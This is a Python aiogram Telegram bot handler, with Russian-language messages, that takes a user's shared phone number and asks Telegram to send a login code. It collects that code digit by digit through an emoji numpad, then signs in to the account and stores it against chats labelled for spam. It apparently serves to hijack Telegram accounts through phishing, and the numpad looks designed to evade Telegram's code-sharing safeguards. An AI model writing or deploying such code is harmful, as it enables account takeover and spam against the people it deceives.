import asyncio

from aiogram import F
from aiogram.fsm.context import FSMContext
from aiogram.types import Message

from signature import SettingsBot
from keyboards.reply import ReplyKb as kb

from utils.states.state import RegisterAcc
from handlers.soft.code import send_phone_code_user, register_phone_code, start_listen_message


class Account:
    def __init__(self, bot: SettingsBot) -> None:
        self.bot = bot
        self.dp = bot.dp
        self.udb = bot.udb
        self.cfg = bot.config


    async def register_handlers(self):
        self.dp.message(F.contact)(self.add_account)
        self.dp.message(RegisterAcc.CODE, F.text)(self.process_code_input)


    async def add_account(self, m: Message, state: FSMContext):
        phone = m.contact.phone_number
        await m.delete()

        msg = await m.answer(
            f"📩 Отправьте код, который пришел на номер {phone}\n\n<b>Код:</b> ⬜⬜⬜⬜⬜",
            reply_markup=await kb.numpad_menu())

        status, resp = await send_phone_code_user(phone=phone)

        if not status:
            await m.answer(f"❌ <b>{resp}</b>")
            await state.clear()
            return

        await state.update_data(phone=phone, hash=resp, code='', msg_id=msg.message_id)
        await state.set_state(RegisterAcc.CODE)


    async def process_code_input(self, m: Message, state: FSMContext):
        await m.delete()
        data = await state.get_data()
        code = data.get("code", '')
        msg_id = data.get("msg_id")

        if m.text == "❌":
            code = code[:-3] 

        elif (len(code) // 3) < 5:
            code += m.text

        display_code = "".join(code + "⬜" * (5 - (len(code) // 3)))

        try:
            await m.bot.delete_message(chat_id=m.chat.id, message_id=msg_id)
        except Exception as e: print(e)

        msg = await m.answer(
            text=f"📩 Отправьте код, который пришел на номер {data['phone']}\n\n<b>Код:</b> {display_code}",
            reply_markup=await kb.numpad_menu())
        await state.update_data(msg_id=msg.message_id)

        if (len(code) // 3) == 5:
            await self.verify_code(m, state, code)
        else:
            await state.update_data(code=code)


    async def verify_code(self, m: Message, state: FSMContext, code: str):
        data = await state.get_data()
        phone = data['phone']
        status, resp = await register_phone_code(phone=phone, phone_code_hash=data['hash'], code=code)

        if not status:
            await m.answer(text=f"❌ <b>{resp}</b>", reply_markup=await kb.main_menu())
            return await state.clear()

        chats = await self.udb.user.get_chats_spams()

        if chats:
            for chat in chats:
                try:
                    member = await m.bot.get_chat_member(chat_id=chat, user_id=m.from_user.id)

                    if member.status == "member":
                        spam_chat, admin_chat = await self.udb.accounts.add_account(
                            spam_chat=chat, account_uid=resp.id, uname=resp.username, phone=phone)

                        await m.answer(
                            text=f"<b>✅ Аккаунт {phone} успешно добавлен!</b>", reply_markup=await kb.del_connect_menu())

                except Exception as e: print(f"❌ Ошибка при проверке чата {chat}: {e}")

        await state.clear()
